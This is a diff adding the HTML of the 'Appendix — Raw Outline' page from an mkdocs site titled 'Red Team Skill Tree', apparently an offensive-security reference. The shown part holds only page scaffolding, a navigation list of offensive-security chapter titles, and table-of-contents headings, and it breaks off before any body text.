@@ -1,0 +1,5747 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Full-stack offensive security reference — anti-attribution, reconnaissance, AD attacks, C2 development, AV/EDR evasion, cloud-native and AI-powered attacks, updated with 2025-2026 APT techniques.">
+      
+      
+      
+        <link rel="canonical" href="https://lupingqaq.github.io/red-team-skill-tree/appendix/">
+      
+      
+        <link rel="prev" href="../ch-24/">
+      
+      
+        <link rel="next" href="../zh-CN/">
+      
+      
+        
+          <link rel="alternate" href="/red-team-skill-tree/" hreflang="en">
+        
+          <link rel="alternate" href="/red-team-skill-tree/zh-CN/" hreflang="zh">
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>Appendix — Raw Outline - Red Team Skill Tree</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#red-team-training-syllabus" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href=".." title="Red Team Skill Tree" class="md-header__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Red Team Skill Tree
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Appendix — Raw Outline
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="red"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+      <div class="md-header__option">
+  <div class="md-select">
+    
+    <button class="md-header__button md-icon" aria-label="Select language">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m12.87 15.07-2.54-2.51.03-.03A17.5 17.5 0 0 0 14.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2zm-2.62 7 1.62-4.33L19.12 17z"/></svg>
+    </button>
+    <div class="md-select__inner">
+      <ul class="md-select__list">
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/" hreflang="en" class="md-select__link">
+              English
+            </a>
+          </li>
+        
+          <li class="md-select__item">
+            <a href="/red-team-skill-tree/zh-CN/" hreflang="zh" class="md-select__link">
+              简体中文
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="Red Team Skill Tree" class="md-nav__button md-logo" aria-label="Red Team Skill Tree" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Red Team Skill Tree
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/lupingQAQ/red-team-skill-tree" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    lupingQAQ/red-team-skill-tree
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. Anti-Attribution and Anonymization
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Penetration Testing in Practice
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Code Audit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Post-Exploitation and Internal Network Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Server and Personal PC Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-07/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. Phishing
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-08/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. RAT/C2 Tool Development
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-09/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9. Trojan AV/EDR Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10. Evidence Image System Restore (Linux)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-11/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    11. Practical Wordlists and Toolkits
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-12/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    12. AI-Powered Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-13/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    13. Cloud-Native Attack and Defense
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-14/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    14. Modern C2 Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-15/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    15. Advanced Evasion Techniques
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-16/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    16. Latest AD/Infrastructure Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-17/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    17. Initial Access Evolution
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-18/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    18. Cloud Post-Exploitation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-19/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    19. HVV / Red-vs-Blue Practical Topics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-20/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    20. Zero Trust Environment Bypass
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-21/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    21. OT/ICS Industrial Control Security
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-22/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    22. Mobile Attacks
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-23/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    23. Living off the Land (LotL) Attack Chains
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ch-24/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    24. Outdated Content Warnings and Alternatives
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendix — Raw Outline
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Appendix — Raw Outline
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#anti-attribution-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        (Anti-)Attribution Techniques
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="(Anti-)Attribution Techniques">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#work-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Work Environment Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Work Environment Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#host-disk-encryption" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Host Disk Encryption
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#virtual-machine-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Virtual Machine Environment Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#personal-information-cleanup" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Personal Information Cleanup
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#android-vm-physical-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Android VM + Physical Machine
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#whom-anti-attribution-targets" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Whom Anti-Attribution Targets
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#which-chains-were-built" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Which Chains Were Built
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-information-each-hop-of-the-chain-leaks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What Information Each Hop of the Chain Leaks
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#who-can-obtain-this-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Who Can Obtain This Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#time-cost" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Time Cost?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#required-permissions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Required Permissions
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#network-environment-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Network Environment Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Network Environment Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#anonymous-work-chain-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Anonymous Work Chain Configuration
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#penetration-testing-environment-and-tool-configuration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Penetration Testing Environment and Tool Configuration
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Penetration Testing Environment and Tool Configuration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#create-accounts" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Create Accounts
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tools" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tools
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#wordlists" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Wordlists
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#httpslcxccpost3213" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        https://lcx.cc/post/3213/
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#white-label-igaming-platform-providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        White-Label iGaming Platform Providers
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="White-Label iGaming Platform Providers">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#financier-provides-site-building-servicesdevelopment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Financier -&gt; provides site-building services/development
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#counterintelligence-and-counter-espionage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Counterintelligence and Counter-espionage
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Counterintelligence and Counter-espionage">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#commercial-espionage-content-deleted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Commercial Espionage (content deleted)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#geopolitical-confrontation-spies-of-different-regimes-content-deleted" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Geopolitical Confrontation | Spies of Different Regimes (content deleted)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reconnaissance
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#website-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Website Reconnaissance
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Website Reconnaissance">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sgk-data-source-collection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SGK data source collection
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#what-to-look-at-once-you-have-a-site" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What to Look at Once You Have a Site
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#open-source-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Open-Source Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#supply-chain-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Supply Chain Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#osint-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OSINT Reconnaissance
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-cdn" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass CDN
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#practical-attribution-of-site-building-companies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Practical Attribution of Site-Building Companies
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Practical Attribution of Site-Building Companies">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#attribution-of-gambling-white-label-platform-providers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attribution of Gambling White-Label Platform Providers
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#attribution-of-gang-member-information" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Attribution of Gang Member Information
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
